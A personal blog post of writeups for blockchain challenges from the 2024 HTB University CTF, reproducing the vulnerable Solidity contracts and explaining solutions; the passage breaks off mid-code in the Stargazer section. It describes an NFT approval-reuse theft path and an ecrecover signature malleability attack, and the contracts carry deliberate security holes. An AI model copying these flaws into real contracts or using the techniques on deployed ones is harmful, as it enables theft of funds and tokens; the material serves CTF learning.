---
title: "HTB Binary Badlands 24"
date: 2024-12-16
draft: false
tags: ['ctf', 'blockchain']
---

Here are my writeups for the 2024 HTB University CTF blockchain challenges.

<!--more-->



## Cryopod


{{< collapsetabs "Challenge Files" >}}
{{< tabs tabTotal="2" >}}
{{% tab tabName="CryoPod.sol" %}}
~~~solidity
contract CryoPod {
    mapping(address => string) private pods;

    event PodStored(address indexed user, string data);

    /**
     * @dev Stores or updates the caller's pod with the provided data.
     * @param _data The information to be stored in the user's pod.
     */
    function storePod(string memory _data) external {
        pods[msg.sender] = _data;
        emit PodStored(msg.sender, _data);
    }
}
~~~
{{% /tab %}}
{{% tab tabName="Setup.sol" %}}
~~~solidity
contract Setup {
    CryoPod public immutable TARGET;
    bytes32 public flagHash = 0x0;

    event DeployedTarget(address at);

    constructor() payable {
        TARGET = new CryoPod();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved(string calldata flag) public view returns (bool) {
        return keccak256(abi.encodePacked(flag)) == flagHash;
    }
}
~~~
{{% /tab %}}
{{< /tabs >}}
{{< /collapsetabs >}}
This one was slightly confusing initially because the setup contract was not complete. (This is a trend that will continue for the rest of the challenges.) Essentially, a cryopod has been deployed with a string stored in it, and all we need to do is retrieve that string and submit it to solve the challenge.

To do so, we simply need to look through the transaction logs on CryoPod's address, this can be done using cast with a command like `cast logs`

{{< breakline >}}
## Forgotten Artifiact

{{< collapsetabs "Challenge Files" >}}
{{< tabs tabTotal="2" >}}

{{% tab tabName="ForgottenArtifact.sol" %}}
~~~solidity
contract ForgottenArtifact {
    uint256 public lastSighting;

    struct Artifact {
        uint32 origin;
        address discoverer;
    }

    constructor(uint32 _origin, address _discoverer) {
        Artifact storage starrySpurr;
        bytes32 seed = keccak256(abi.encodePacked(block.number, block.timestamp, msg.sender));
        assembly { starrySpurr.slot := seed }
        starrySpurr.origin = _origin;
        starrySpurr.discoverer = _discoverer;
        lastSighting = _origin;
    }

    function discover(bytes32 _artifactLocation) public {
        Artifact storage starrySpurr;
        assembly { starrySpurr.slot := _artifactLocation }
        require(starrySpurr.origin != 0, "ForgottenArtifact: unknown artifact location.");
        starrySpurr.discoverer = msg.sender;
        lastSighting = block.timestamp;
    }
}
~~~
{{% /tab %}}
{{% tab tabName="Setup.sol" %}}
~~~solidity
import { ForgottenArtifact } from "./ForgottenArtifact.sol";

contract Setup {
    uint256 public constant ARTIFACT_ORIGIN = 0xdead;
    ForgottenArtifact public immutable TARGET;
    
    event DeployedTarget(address at);

    constructor() payable {
        TARGET = new ForgottenArtifact(uint32(ARTIFACT_ORIGIN), address(0));
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return TARGET.lastSighting() > ARTIFACT_ORIGIN;
    }
}
~~~
{{% /tab %}}

{{< /tabs >}}

{{< /collapsetabs >}}

The `isSolved()` function requires `TARGET.lastSighting() > ARTIFACT_ORIGIN`. Thus, we just need to call the discover function, which means we need to recover the specific storage slot the artifact was stored at. This is quite simple, as the block.number, block.timestamp, and msg.sender are all publically available via the transaction log. Once again, we simply need to look through the transaction logs to find when `discover(bytes32)` was called, using `cast logs`.


{{< breakline >}}
## Frontier Marketplace

{{< collapsetabs "Challenge Files" >}}
{{< tabs tabTotal="3" >}}

{{% tab tabName="FrontierNFT.sol" %}}
~~~solidity
contract FrontierNFT {
    string public name = "FrontierNFT";
    string public symbol = "FRNT";
    
    uint256 private _tokenId = 1;
    address private _marketplace;
    mapping(uint256 tokenId => address) private _owners;
    mapping(address owner => uint256) private _balances;
    mapping(uint256 tokenId => address) private _tokenApprovals;
    mapping(address owner => mapping(address operator => bool)) private _operatorApprovals;

    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    modifier onlyMarketplace() {
        require(msg.sender == _marketplace, "FrontierNFT: caller is not authorized");
        _;
    }

    constructor(address marketplace) {
        _marketplace = marketplace;
    }

    function balanceOf(address owner) public view returns (uint256) {
        require(owner != address(0), "FrontierNFT: invalid owner address");
        return _balances[owner];
    }

    function ownerOf(uint256 tokenId) public view returns (address) {
        address owner = _owners[tokenId];
        require(owner != address(0), "FrontierNFT: queried owner for nonexistent token");
        return owner;
    }

    function approve(address to, uint256 tokenId) public {
        address owner = ownerOf(tokenId);
        require(msg.sender == owner, "FrontierNFT: approve caller is not the owner");
        _tokenApprovals[tokenId] = to;
        emit Approval(owner, to, tokenId);
    }

    function getApproved(uint256 tokenId) public view returns (address) {
        require(_owners[tokenId] != address(0), "FrontierNFT: queried approvals for nonexistent token");
        return _tokenApprovals[tokenId];
    }

    function setApprovalForAll(address operator, bool approved) public {
        require(operator != address(0), "FrontierNFT: invalid operator");
        _operatorApprovals[msg.sender][operator] = approved;
        emit ApprovalForAll(msg.sender, operator, approved);
    }

    function isApprovedForAll(address owner, address operator) public view returns (bool) {
        return _operatorApprovals[owner][operator];
    }

    function transferFrom(address from, address to, uint256 tokenId) public {
        require(to != address(0), "FrontierNFT: invalid transfer receiver");
        require(from == ownerOf(tokenId), "FrontierNFT: transfer of token that is not own");
        require(
            msg.sender == from || isApprovedForAll(from, msg.sender) || msg.sender == getApproved(tokenId),
            "FrontierNFT: transfer caller is not owner nor approved"
        );

        _balances[from] -= 1;
        _balances[to] += 1;
        _owners[tokenId] = to;

        emit Transfer(from, to, tokenId);
    }

    function mint(address to) public onlyMarketplace returns (uint256) {
        uint256 currentTokenId = _tokenId;
        _mint(to, currentTokenId);
        return currentTokenId;
    }

    function burn(uint256 tokenId) public onlyMarketplace {
        _burn(tokenId);
    }

    function _mint(address to, uint256 tokenId) internal {
        require(to != address(0), "FrontierNFT: invalid mint receiver");
        require(_owners[tokenId] == address(0), "FrontierNFT: token already minted");

        _balances[to] += 1;
        _owners[tokenId] = to;
        _tokenId += 1;

        emit Transfer(address(0), to, tokenId);
    }

    function _burn(uint256 tokenId) internal {
        address owner = ownerOf(tokenId);
        require(msg.sender == owner, "FrontierNFT: caller is not the owner");
        _balances[owner] -= 1;
        delete _owners[tokenId];

        emit Transfer(owner, address(0), tokenId);
    }
}

~~~
{{% /tab %}}
{{% tab tabName="FrontierMarketplace.sol" %}}
~~~solidity
import { FrontierNFT } from "./FrontierNFT.sol";

contract FrontierMarketplace {
    uint256 public constant TOKEN_VALUE = 10 ether;
    FrontierNFT public frontierNFT;
    address public owner;

    event NFTMinted(address indexed buyer, uint256 indexed tokenId);
    event NFTRefunded(address indexed seller, uint256 indexed tokenId);

    constructor() {
        frontierNFT = new FrontierNFT(address(this));
        owner = msg.sender;
    }

    function buyNFT() public payable returns (uint256) {
        require(msg.value == TOKEN_VALUE, "FrontierMarketplace: Incorrect payment amount");
        uint256 tokenId = frontierNFT.mint(msg.sender);
        emit NFTMinted(msg.sender, tokenId);
        return tokenId;
    }
    
    function refundNFT(uint256 tokenId) public {
        require(frontierNFT.ownerOf(tokenId) == msg.sender, "FrontierMarketplace: Only owner can refund NFT");
        frontierNFT.transferFrom(msg.sender, address(this), tokenId);
        payable(msg.sender).transfer(TOKEN_VALUE);
        emit NFTRefunded(msg.sender, tokenId);
    }
}
~~~
{{% /tab %}}
{{% tab tabName="Setup.sol" %}}
~~~solidity
import { FrontierMarketplace } from "./FrontierMarketplace.sol";
import { FrontierNFT } from "./FrontierNFT.sol";

contract Setup {
    FrontierMarketplace public immutable TARGET;
    uint256 public constant PLAYER_STARTING_BALANCE = 20 ether;
    uint256 public constant NFT_VALUE = 10 ether;
    
    event DeployedTarget(address at);

    constructor() payable {
        TARGET = new FrontierMarketplace();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return (
            address(msg.sender).balance > PLAYER_STARTING_BALANCE - NFT_VALUE && 
            FrontierNFT(TARGET.frontierNFT()).balanceOf(msg.sender) > 0
        );
    }
}
~~~
{{% /tab %}}
{{< /tabs >}}
{{< /collapsetabs >}}
For this one, we just need to steal the NFT for free. It turns out theres a sneaky little exploit in the `transferFrom` function, where permission is checked either via `isApprovedForAll` or `getApproved`. Namely, that the permissions don't reset when the token is transfered, giving us the following exploit path.
- Buy the token normally
- Have the NFT be approved for all via `setApprovalForAll` to allow the refundNFT function to work
- Use `approve` to approve ourselves
- Refund the NFT
- Having approved ourselves prior, use `transferFrom` to transfer the NFT back to ourselves.

{{< breakline >}}
## Stargazer
{{< collapsetabs "Challenge Files" >}}
{{< tabs tabTotal="3" >}}

{{% tab tabName="Stargazer.sol" %}}
~~~solidity
contract Stargazer is ERC1967Proxy {
    constructor(address _implementation, bytes memory _data) ERC1967Proxy(_implementation, _data) {}
}

/**************************************************************************
    a lonely machine in a lonely world looking a lonely shooting star...   
***************************************************************************
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⠤⢤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠒⢋⣉⣀⣠⣄⣀⣈⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣯⠴⠚⠉⠉⠀⠀⠀⠀⣤⠏⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⡇⠁⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡿⠿⢛⠁⠁⣸⠀⠀⠀⠀⠀⣤⣾⠵⠚⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⡀⠀⣠⠀⡇⢧⠀⠀⢀⣠⡾⡇⠀⠀⠀⠀⠀⣠⣴⠿⠋⠁⠀⠀⠀⠀⠘⣿⠀⣀⡠⠞⠛⠁⠂⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⣻⡦⣞⡿⣷⠸⣄⣡⢾⡿⠁⠀⠀⠀⣀⣴⠟⠋⠁⠀⠀⠀⠀⠐⠠⡤⣾⣙⣶⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣂⡷⠰⣔⣾⣖⣾⡷⢿⣐⣀⣀⣤⢾⣋⠁⠀⠀⠀⣀⢀⣀⣀⣀⣀⠀⢀⢿⠑⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠠⡦⠴⠴⠤⠦⠤⠤⠤⠤⠤⠴⠶⢾⣽⣙⠒⢺⣿⣿⣿⣿⢾⠶⣧⡼⢏⠑⠚⠋⠉⠉⡉⡉⠉⠉⠹⠈⠁⠉⠀⠨⢾⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠂⠐⠀⠀⠀⠈⣇⡿⢯⢻⣟⣇⣷⣞⡛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣆⠀⠀⠀⠀⢠⡷⡛⣛⣼⣿⠟⠙⣧⠅⡄⠀⠀⠀⠀⠀⠀⠰⡆⠀⠀⠀⠀⢠⣾⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⢶⠏⠉⠀⠀⠀⠀⠀⠿⢠⣴⡟⡗⡾⡒⠖⠉⠏⠁⠀⠀⠀⠀⣀⢀⣠⣧⣀⣀⠀⠀⠀⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⣠⣷⢿⠋⠁⣿⡏⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⢭⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡴⢏⡵⠛⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠛⠀⠀⠀⠀⢿⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢿⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣼⠛⣲⡏⠁⠀⠀⠀⠀⠀⢀⣠⡾⠋⠉⠀⠀⠀⠀⠀⠀⢾⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡴⠟⠀⢰⡯⠄⠀⠀⠀⠀⣠⢴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡾⠁⠁⠀⠘⠧⠤⢤⣤⠶⠏⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⣇⠂⢀⣀⣀⠤⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
***************************************************************************
    ...wondering if it will get the chance to witness it again.            
**************************************************************************/
~~~
{{% /tab %}}
{{% tab tabName="StargazerKernel.sol" %}}
~~~solidity
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract StargazerKernel is UUPSUpgradeable {
    // keccak256(abi.encode(uint256(keccak256("htb.storage.Stargazer")) - 1)) & ~bytes32(uint256(0xff));
    bytes32 private constant __STARGAZER_MEMORIES_LOCATION = 0x8e8af00ddb7b2dfef2ccc4890803445639c579a87f9cda7f6886f80281e2c800;
    
    /// @custom:storage-location erc7201:htb.storage.Stargazer
    struct StargazerMemories {
        uint256 originTimestamp; 
        mapping(bytes32 => uint256[]) starSightings;
        mapping(bytes32 => bool) usedPASKATickets;
        mapping(address => KernelMaintainer) kernelMaintainers;
    }

    struct KernelMaintainer {
        address account;
        PASKATicket[] PASKATickets;
        uint256 PASKATicketsNonce;
    }

    struct PASKATicket {
        bytes32 hashedRequest;
        bytes signature;
    }

    event PASKATicketCreated(PASKATicket ticket);
    event StarSightingRecorded(string starName, uint256 sightingTimestamp);
    event AuthorizedKernelUpgrade(address newImplementation);

    function initialize(string[] memory _pastStarSightings) public initializer onlyProxy {
        StargazerMemories storage $ = _getStargazerMemory();
        $.originTimestamp = block.timestamp;
        $.kernelMaintainers[tx.origin].account = tx.origin;
        for (uint256 i = 0; i < _pastStarSightings.length; i++) {
            bytes32 starId = keccak256(abi.encodePacked(_pastStarSightings[i]));
            $.starSightings[starId].push(block.timestamp);
        }
    }

    function createPASKATicket(bytes memory _signature) public onlyProxy {
        StargazerMemories storage $ = _getStargazerMemory();
        uint256 nonce = $.kernelMaintainers[tx.origin].PASKATicketsNonce;
        bytes32 hashedRequest = _prefixed(
            keccak256(abi.encodePacked("PASKA: Privileged Authorized StargazerKernel Action", nonce))
        );
        PASKATicket memory newTicket = PASKATicket(hashedRequest, _signature);
        _verifyPASKATicket(newTicket);
        $.kernelMaintainers[tx.origin].PASKATickets.push(newTicket);
        $.kernelMaintainers[tx.origin].PASKATicketsNonce++;
        emit PASKATicketCreated(newTicket);
    }

    function commitStarSighting(string memory _starName) public onlyProxy {
        address author = tx.origin;
        PASKATicket memory starSightingCommitRequest = _consumePASKATicket(author);
        StargazerMemories storage $ = _getStargazerMemory();
        bytes32 starId = keccak256(abi.encodePacked(_starName));
        uint256 sightingTimestamp = block.timestamp;
        $.starSightings[starId].push(sightingTimestamp);
        emit StarSightingRecorded(_starName, sightingTimestamp);
    }

    function getStarSightings(string memory _starName) public view onlyProxy returns (uint256[] memory) {
        StargazerMemories storage $ = _getStargazerMemory();
        bytes32 starId = keccak256(abi.encodePacked(_starName));
        return $.starSightings[starId];
    }

    function _getStargazerMemory() private view onlyProxy returns (StargazerMemories storage $) {
        assembly { $.slot := __STARGAZER_MEMORIES_LOCATION }
    }

    function _getKernelMaintainerInfo(address _kernelMaintainer) internal view onlyProxy returns (KernelMaintainer memory) {
        StargazerMemories storage $ = _getStargazerMemory();
        return $.kernelMaintainers[_kernelMaintainer];
    }

    function _authorizeUpgrade(address _newImplementation) internal override onlyProxy {
        address issuer = tx.origin;
        PASKATicket memory kernelUpdateRequest = _consumePASKATicket(issuer);
        emit AuthorizedKernelUpgrade(_newImplementation);
    }

    function _consumePASKATicket(address _kernelMaintainer) internal onlyProxy returns (PASKATicket memory) {
        StargazerMemories storage $ = _getStargazerMemory();
        KernelMaintainer storage maintainer = $.kernelMaintainers[_kernelMaintainer];
        PASKATicket[] storage activePASKATickets = maintainer.PASKATickets;
        require(activePASKATickets.length > 0, "StargazerKernel: no active PASKA tickets.");
        PASKATicket memory ticket = activePASKATickets[activePASKATickets.length - 1];
        bytes32 ticketId = keccak256(abi.encode(ticket));
        $.usedPASKATickets[ticketId] = true;
        activePASKATickets.pop();
        return ticket;
    }

    function _verifyPASKATicket(PASKATicket memory _ticket) internal view onlyProxy {
        StargazerMemories storage $ = _getStargazerMemory();
        address signer = _recoverSigner(_ticket.hashedRequest, _ticket.signature);
        require(_isKernelMaintainer(signer), "StargazerKernel: signer is not a StargazerKernel maintainer.");
        bytes32 ticketId = keccak256(abi.encode(_ticket));
        require(!$.usedPASKATickets[ticketId], "StargazerKernel: PASKA ticket already used.");
    }

    function _recoverSigner(bytes32 _message, bytes memory _signature) internal view onlyProxy returns (address) {
        require(_signature.length == 65, "StargazerKernel: invalid signature length.");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly ("memory-safe") {
            r := mload(add(_signature, 0x20))
            s := mload(add(_signature, 0x40))
            v := byte(0, mload(add(_signature, 0x60)))
        }
        require(v == 27 || v == 28, "StargazerKernel: invalid signature version");
        address signer = ecrecover(_message, v, r, s);
        require(signer != address(0), "StargazerKernel: invalid signature.");
        return signer;
    }

    function _isKernelMaintainer(address _account) internal view onlyProxy returns (bool) {
        StargazerMemories storage $ = _getStargazerMemory();
        return $.kernelMaintainers[_account].account == _account;
    }

    function _prefixed(bytes32 hash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    }
}

~~~
{{% /tab %}}
{{% tab tabName="Setup.sol" %}}
~~~solidity
import { Stargazer } from "./Stargazer.sol";
import { StargazerKernel } from "./StargazerKernel.sol";

contract Setup {
    Stargazer public immutable TARGET_PROXY;
    StargazerKernel public immutable TARGET_IMPL;

    event DeployedTarget(address proxy, address implementation);

    constructor(bytes memory signature) payable {
        TARGET_IMPL = new StargazerKernel();
        
        string[] memory starNames = new string[](1);
        starNames[0] = "Nova-GLIM_007";
        bytes memory initializeCall = abi.encodeCall(TARGET_IMPL.initialize, starNames);
        TARGET_PROXY = new Stargazer(address(TARGET_IMPL), initializeCall);
        
        bytes memory createPASKATicketCall = abi.encodeCall(TARGET_IMPL.createPASKATicket, (signature));
        (bool success, ) = address(TARGET_PROXY).call(createPASKATicketCall);
        require(success);

        string memory starName = "Starry-SPURR_001";
        bytes memory commitStarSightingCall = abi.encodeCall(TARGET_IMPL.commitStarSighting, (starName));
        (success, ) = address(TARGET_PROXY).call(commitStarSightingCall);
        require(success);

        emit DeployedTarget(address(TARGET_PROXY), address(TARGET_IMPL));
    }

    function isSolved() public returns (bool) {
        bool success;
        bytes memory getStarSightingsCall;
        bytes memory returnData;

        getStarSightingsCall = abi.encodeCall(TARGET_IMPL.getStarSightings, ("Nova-GLIM_007"));
        (success, returnData) = address(TARGET_PROXY).call(getStarSightingsCall);
        require(success, "Setup: failed external call.");
        uint256[] memory novaSightings = abi.decode(returnData, (uint256[]));
        
        getStarSightingsCall = abi.encodeCall(TARGET_IMPL.getStarSightings, ("Starry-SPURR_001"));
        (success, returnData) = address(TARGET_PROXY).call(getStarSightingsCall);
        require(success, "Setup: failed external call.");
        uint256[] memory starrySightings = abi.decode(returnData, (uint256[]));
        
        return (novaSightings.length >= 2 && starrySightings.length >= 2);
    }
}
~~~
{{% /tab %}}
{{< /tabs >}}

{{< /collapsetabs >}}
For this challenge, we have an upgradable contract behind an ERC1967 proxy. To solve it, we need to sight `Nova-GLIM_007` and `Starry-SPURR_001` twice each. To do so, we would have to call `commitStarSigning` four times. However, we are blocked by the fact that `commitStarSigning` requires one PASKATicket per call, and we have none to our name.

Looking at the `createPASKATicket` and related functions is thus our next step.


{{< tabs tabTotal="3" >}}

{{% tab tabName="createPASKATicket" %}}
~~~solidity
function createPASKATicket(bytes memory _signature) public onlyProxy {
    StargazerMemories storage $ = _getStargazerMemory();
    uint256 nonce = $.kernelMaintainers[tx.origin].PASKATicketsNonce;
    bytes32 hashedRequest = _prefixed(
        keccak256(abi.encodePacked("PASKA: Privileged Authorized StargazerKernel Action", nonce))
    );
    PASKATicket memory newTicket = PASKATicket(hashedRequest, _signature);
    _verifyPASKATicket(newTicket);
    $.kernelMaintainers[tx.origin].PASKATickets.push(newTicket);
    $.kernelMaintainers[tx.origin].PASKATicketsNonce++;
    emit PASKATicketCreated(newTicket);
}
~~~
{{% /tab %}}
{{% tab tabName="_verifyPASKATicket" %}}
~~~solidity
function _verifyPASKATicket(PASKATicket memory _ticket) internal view onlyProxy {
    StargazerMemories storage $ = _getStargazerMemory();
    address signer = _recoverSigner(_ticket.hashedRequest, _ticket.signature);
    require(_isKernelMaintainer(signer), "StargazerKernel: signer is not a StargazerKernel maintainer.");
    bytes32 ticketId = keccak256(abi.encode(_ticket));
    require(!$.usedPASKATickets[ticketId], "StargazerKernel: PASKA ticket already used.");
}
~~~
{{% /tab %}}
{{% tab tabName="_recoverSigner" %}}
~~~solidity
function _recoverSigner(bytes32 _message, bytes memory _signature) internal view onlyProxy returns (address) {
    require(_signature.length == 65, "StargazerKernel: invalid signature length.");
    bytes32 r;
    bytes32 s;
    uint8 v;
    assembly ("memory-safe") {
        r := mload(add(_signature, 0x20))
        s := mload(add(_signature, 0x40))
        v := byte(0, mload(add(_signature, 0x60)))
    }
    require(v == 27 || v == 28, "StargazerKernel: invalid signature version");
    address signer = ecrecover(_message, v, r, s);
    require(signer != address(0), "StargazerKernel: invalid signature.");
    return signer;
}
~~~
{{% /tab %}}
{{< /tabs >}}

A few things stand out here. Firstly, everything uses `tx.origin` instead of `msg.sender`, meaning we won't be able to get our way arround account restrictions simply by creating more contracts as proxies. Secondly, we can spot the use of `ecrecover` in `_recoverSigner`. This is a point of suspicion, as smart contracts nowadays would use the OpenZepellin ECDSA instead of using `ecrecover` directly to avoid vulnerabilites.

Looking at the code, we can see that it does do the proper checks for signature length, and invalid signer address. However, we can see it does not perform any checks on `s` and `r`, and allows for both 27 and 28 for `v`, leaving it vulnerable to a signature malleability attack. In essence, since a signature is a point on a symmetrical curve (secp256k1), there will always be a pair of valid public keys, and thus a pair of valid signatures for a given message.

~~~solidity
function tryRecover(
    bytes32 hash,
    uint8 v,
    bytes32 r,
    bytes32 s
) internal pure returns (address recovered, RecoverError err, bytes32 errArg) {
    // This tryRecover function is from OpenZepellin's ECDSA library, and we can see how it performs an additional check to allow for only 1 of the 2 public keys, by setting an upper bound on s.
    if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {
        return (address(0), RecoverError.InvalidSignatureS, s);
    }

    // If the signature is valid (and not malleable), return the signer address
    address signer = ecrecover(hash, v, r, s);
    if (signer == address(0)) {
        return (address(0), RecoverError.InvalidSignature, bytes32(0));
    }

    return (signer, RecoverError.NoError, bytes32(0));
}
~~~
Thus, by using this attack, we can net ourselves an additional ticket based on the one ticket that has been created already. However, you may recall I mentioned earlier that we needed 4 tickets. Well, also remember how the contract is upgradable?

~~~solidity
function _authorizeUpgrade(address _newImplementation) internal override onlyProxy {
